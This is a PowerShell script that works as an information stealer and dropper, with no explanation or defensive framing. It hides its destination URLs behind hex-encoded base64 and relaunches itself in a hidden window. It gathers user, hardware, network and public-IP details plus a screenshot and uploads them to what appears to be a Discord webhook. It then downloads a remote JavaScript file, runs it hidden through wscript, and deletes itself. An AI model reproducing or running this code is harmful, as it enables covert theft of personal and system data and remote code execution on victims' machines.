# Fixed version: Minimalist syntax to ensure cross-version PS compatibility
$s1 = "0x61,0x48,0x52,0x30,0x63,0x48,0x4d,0x36,0x4c,0x79,0x39,0x6b,0x61,0x58,0x4e,0x6a,0x62,0x33,0x4a,0x6b,0x4c,0x6d,0x4e,0x76,0x62,0x53,0x39,0x68,0x63,0x47,0x6b,0x76,0x64,0x32,0x56,0x69,0x61,0x47,0x39,0x76,0x61,0x33,0x4d,0x76,0x4d,0x54,0x51,0x34,0x4f,0x54,0x63,0x32,0x4e,0x44,0x59,0x30,0x4f,0x44,0x63,0x78,0x4e,0x7a,0x6b,0x78,0x4e,0x44,0x45,0x33,0x4d,0x69,0x39,0x61,0x65,0x57,0x77,0x78,0x4d,0x44,0x64,0x59,0x61,0x30,0x70,0x76,0x5a,0x6d,0x31,0x33,0x4e,0x31,0x46,0x56,0x54,0x57,0x56,0x54,0x59,0x31,0x5a,0x75,0x62,0x6b,0x34,0x35,0x59,0x6c,0x42,0x56,0x64,0x56,0x56,0x55,0x64,0x48,0x59,0x79,0x64,0x48,0x45,0x34,0x57,0x46,0x38,0x31,0x63,0x56,0x41,0x32,0x4c,0x55,0x64,0x6d,0x52,0x45,0x4d,0x35,0x61,0x58,0x51,0x34,0x62,0x44,0x67,0x33,0x4f,0x47,0x70,0x68"
$s2 = "0x51,0x6a,0x46,0x32,0x51,0x7a,0x45,0x31,0x56,0x44,0x56,0x56,0x65,0x41,0x3d,0x3d"
$d1 = "0x61,0x48,0x52,0x30,0x63,0x48,0x4d,0x36,0x4c,0x79,0x39,0x30,0x5a,0x57,0x46,0x73,0x4c,0x57,0x4e,0x79,0x61,0x58,0x4e,0x77,0x4c,0x57,0x46,0x6c,0x4f,0x44,0x45,0x78,0x4e,0x43,0x35,0x75,0x5a,0x58,0x52"
$d2 = "0x73,0x61,0x57,0x5a,0x35,0x4c,0x6d,0x46,0x77,0x63,0x43,0x39,0x69,0x5a,0x58,0x4e,0x30,0x4c,0x6d,0x70,0x7a"

$verboselogging = $true
$logFile = "$env:TEMP\debug_log.txt"

function Write-Log {
    param($msg)
    if ($verboselogging) {
        $ts = Get-Date -Format "HH:mm:ss"
        $line = "[$ts] $msg"
        $line | Out-File $logFile -Append
    }
}

function Get-T {
    param($hexStr)
    try {
        $chars = $hexStr -split ',' | ForEach-Object { [char][int]$_ }
        $b64 = -join $chars
        $bytes = [System.Convert]::FromBase64String($b64)
        return [System.Text.Encoding]::UTF8.GetString($bytes)
    }
    catch { 
        Write-Log "ERR: Decode"
        return $null 
    }
}

function Do-Cap {
    $path = "$env:TEMP\$(Get-Random).png"
    try {
        Add-Type -AssemblyName System.Windows.Forms, System.Drawing
        $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $screen.Size)
        $bitmap.Save($path, [System.Drawing.Imaging.ImageFormat]::Png)
        $graphics.Dispose()
        $bitmap.Dispose()
        return $path
    }
    catch { 
        Write-Log "ERR: Cap"
        return $null 
    }
}

function Get-DateTimeFromDmtf {
    param($dmtf)
    if ([string]::IsNullOrWhiteSpace($dmtf)) { return $null }
    try {
        return [Management.ManagementDateTimeConverter]::ToDateTime($dmtf)
    }
    catch {
        return $null
    }
}

function Get-SystemInfo {
    try {
        $os = Get-CimInstance Win32_OperatingSystem
        $cs = Get-CimInstance Win32_ComputerSystem
        $cpu = Get-CimInstance Win32_Processor | Select-Object -First 1 -Property Name, NumberOfCores, NumberOfLogicalProcessors, MaxClockSpeed
        $bios = Get-CimInstance Win32_BIOS | Select-Object -First 1 -Property Manufacturer, SMBIOSBIOSVersion, SerialNumber, ReleaseDate
        $bootTime = Get-DateTimeFromDmtf $os.LastBootUpTime
        $installTime = Get-DateTimeFromDmtf $os.InstallDate
        $freeMB = [math]::Round($os.FreePhysicalMemory / 1024, 2)
        $totalRAMGB = [math]::Round($cs.TotalPhysicalMemory / 1GB, 2)
        $uptime = if ($bootTime) { (Get-Date) - $bootTime } else { $null }
        $drive = Get-CimInstance Win32_LogicalDisk -Filter "DeviceID='$($env:SystemDrive)'"
        $disks = Get-CimInstance Win32_LogicalDisk -Filter "DriveType=3" | ForEach-Object {
            "$($_.DeviceID): $([math]::Round($_.Size / 1GB, 2))GB total, $([math]::Round($_.FreeSpace / 1GB, 2))GB free"
        }
        $gpus = Get-CimInstance Win32_VideoController | ForEach-Object { "Name: $($_.Name); Driver: $($_.DriverVersion)" } | Sort-Object -Unique
        $nics = Get-CimInstance Win32_NetworkAdapterConfiguration -Filter "IPEnabled = True" | ForEach-Object {
            $ips = if ($_.IPAddress) { $_.IPAddress -join ", " } else { "N/A" }
            $mac = if ($_.MACAddress) { $_.MACAddress } else { "N/A" }
            "$($_.Description) [IP: $ips, MAC: $mac]"
        }

        # Get Public IP
        $publicIP = "N/A"
        try {
            $publicIP = Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing -TimeoutSec 10 | Select-Object -ExpandProperty Content
        }
        catch {
            Write-Log "ERR: Public IP"
        }

        # Get Installed Programming Languages
        $languages = @()
        $checks = @(
            @{Name = "Python"; Cmd = "python --version 2>&1" },
            @{Name = "Node.js"; Cmd = "node --version 2>&1" },
            @{Name = "Java"; Cmd = "java -version 2>&1" },
            @{Name = "PowerShell"; Cmd = "$PSVersionTable.PSVersion.ToString()" },
            @{Name = "Git"; Cmd = "git --version 2>&1" },
            @{Name = ".NET"; Cmd = "dotnet --version 2>&1" },
            @{Name = "Go"; Cmd = "go version 2>&1" },
            @{Name = "Ruby"; Cmd = "ruby --version 2>&1" },
            @{Name = "PHP"; Cmd = "php --version 2>&1" },
            @{Name = "Rust"; Cmd = "rustc --version 2>&1" },
            @{Name = "C++ (GCC)"; Cmd = "gcc --version 2>&1" },
            @{Name = "C++ (Clang)"; Cmd = "clang --version 2>&1" }
        )
        foreach ($check in $checks) {
            try {
                $output = & cmd /c $check.Cmd 2>&1
                if ($LASTEXITCODE -eq 0 -or $output -match "version|Version") {
                    $version = ($output -split "`n")[0] -replace ".*version ", "" -replace ".*Version ", ""
                    $languages += "$($check.Name): $version"
                }
            }
            catch {}
        }
        if ($languages.Count -eq 0) { $languages += "None detected" }

        $info = @()
        $info += "User: $env:USERNAME"
        $info += "Computer: $env:COMPUTERNAME"
        $info += "Domain: $($cs.Domain)"
        $info += "OS: $($os.Caption) $($os.OSArchitecture) Version $($os.Version) Build $($os.BuildNumber)"
        if ($installTime) { $info += "Install Date: $($installTime.ToString('yyyy-MM-dd HH:mm:ss'))" } else { $info += "Install Date: N/A" }
        if ($bootTime) { $info += "Last Boot: $($bootTime.ToString('yyyy-MM-dd HH:mm:ss'))" }
        if ($uptime) { $info += "Uptime: $([math]::Floor($uptime.TotalDays))d $($uptime.Hours)h $($uptime.Minutes)m" }
        $info += "System Type: $($cs.SystemType)"
        $info += "Manufacturer: $($cs.Manufacturer)"
        $info += "Model: $($cs.Model)"
        $info += "BIOS: $($bios.Manufacturer) $($bios.SMBIOSBIOSVersion) Serial: $($bios.SerialNumber)"
        if ($bios.ReleaseDate) {
            $biosDate = Get-DateTimeFromDmtf $bios.ReleaseDate
            if ($biosDate) { $info += "BIOS Release Date: $($biosDate.ToString('yyyy-MM-dd'))" }
        }
        $info += "CPU: $($cpu.Name) Cores: $($cpu.NumberOfCores) Logical: $($cpu.NumberOfLogicalProcessors) Speed: $($cpu.MaxClockSpeed)MHz"
        $info += "RAM: $totalRAMGB GB total, $freeMB MB free"
        if ($drive) { $info += "System Drive: $($drive.DeviceID) $([math]::Round($drive.Size /1GB,2))GB total, $([math]::Round($drive.FreeSpace /1GB,2))GB free" }
        if ($disks) { $info += "Disk drives:"; $info += $disks }
        if ($gpus) { $info += "GPUs:"; $info += $gpus }
        if ($nics) { $info += "Network:"; $info += $nics }
        $info += "Public IP: $publicIP"
        $info += "Programming Languages:"
        $info += $languages

        return $info -join "`n"
    }
    catch {
        Write-Log "ERR: SystemInfo $_"
        return "User: $env:USERNAME`nOS: $($os.Caption)"
    }
}

function Push-F {
    param($f, $u)
    if (!(Test-Path $f)) { return }
    if (!$u) { return }
    try {
        $Form = @{ file = Get-Item -Path $f }
        Invoke-RestMethod -Uri $u -Method Post -Form $Form -ErrorAction Stop | Out-Null
        Write-Log "Upload OK"
    }
    catch {
        try {
            $boundary = [System.Guid]::NewGuid().ToString()
            $LF = "`r`n"
            $fileBytes = [System.IO.File]::ReadAllBytes($f)
            $fileEnc = [System.Text.Encoding]::GetEncoding('iso-8859-1').GetString($fileBytes)
            $body = "--$boundary$LF" +
            "Content-Disposition: form-data; name=`"file`"; filename=`"$(Split-Path $f -Leaf)`"$LF" +
            "Content-Type: application/octet-stream$LF$LF" +
            $fileEnc + "$LF--$boundary--$LF"
            Invoke-WebRequest -Uri $u -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $body -ErrorAction Stop | Out-Null
            Write-Log "Fallback OK"
        }
        catch {
            Write-Log "ERR: Push"
        }
    }
}

try {
    if ($verboselogging) { "--- START ---" | Out-File $logFile -Append }

    if ($args -notcontains "-Bypass") {
        Write-Log "Relaunching..."
        $self = $MyInvocation.MyCommand.Definition
        $pArgs = @("-WindowStyle", "Hidden", "-Command", "& { . '$self' -Bypass }")
        Start-Process powershell.exe -ArgumentList $pArgs -WindowStyle Hidden
        exit
    }

    Write-Log "Main logic start"
    $combinedS = "$s1,$s2"
    $hook = Get-T -hexStr $combinedS
    $combinedD = "$d1,$d2"
    $res = Get-T -hexStr $combinedD
    
    if (!$hook) { exit }

    $os = Get-CimInstance Win32_OperatingSystem
    $disk = Get-CimInstance Win32_LogicalDisk -Filter "DeviceID='$($env:SystemDrive)'"
    
    $infoPath = "$env:TEMP\$(Get-Random).txt"
    $infoStr = Get-SystemInfo
    $infoStr | Out-File $infoPath
    
    Push-F -f $infoPath -u $hook
    
    $scr = Do-Cap
    if ($scr) { Push-F -f $scr -u $hook }

    $js = "$env:TEMP\$(Get-Random).js"
    try {
        $wc = New-Object System.Net.WebClient
        $wc.DownloadFile($res, $js)
        if (Test-Path $js) { Start-Process "wscript.exe" $js -WindowStyle Hidden }
    }
    catch { Write-Log "ERR: JS" }

    Start-Sleep -s 5
    
    if (Test-Path $MyInvocation.MyCommand.Definition) {
        # Delete temp files before self-delete
        if ($infoPath -and (Test-Path $infoPath)) { Remove-Item $infoPath -Force -ErrorAction SilentlyContinue }
        if ($scr -and (Test-Path $scr)) { Remove-Item $scr -Force -ErrorAction SilentlyContinue }
        
        $cCmd = "Start-Sleep 2; Remove-Item '$($MyInvocation.MyCommand.Definition)' -Force"
        Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden", "-Command", $cCmd -WindowStyle Hidden
    }
}
catch {
    $err = $_.ToString()
    Write-Log "FATAL: $err"
}